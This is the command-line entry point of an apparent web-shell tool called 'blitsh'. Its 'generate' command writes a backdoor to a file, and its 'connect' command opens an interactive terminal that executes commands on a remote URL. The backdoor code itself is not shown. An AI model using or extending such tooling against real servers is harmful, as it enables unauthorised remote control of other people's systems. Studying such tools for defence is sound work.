"""Command line entry point.
"""

import click

from blitsh import backdoors
from blitsh.terminal import Terminal
from blitsh.client import Client
from blitsh.commands.exec import ExecCommand


@click.group()
def cli():
    pass


@cli.command()
@click.argument('path', metavar='PATH', type=click.File('w'))
def generate(path):
    """Generates a new backdoor and save in the PATH file
    """
    path.write(backdoors.generate_backdoor())


@cli.command()
@click.argument('url', metavar='URL', type=str)
def connect(url):
    client = Client(url)
    terminal = Terminal(client, [ExecCommand()])
    terminal.cmdloop()
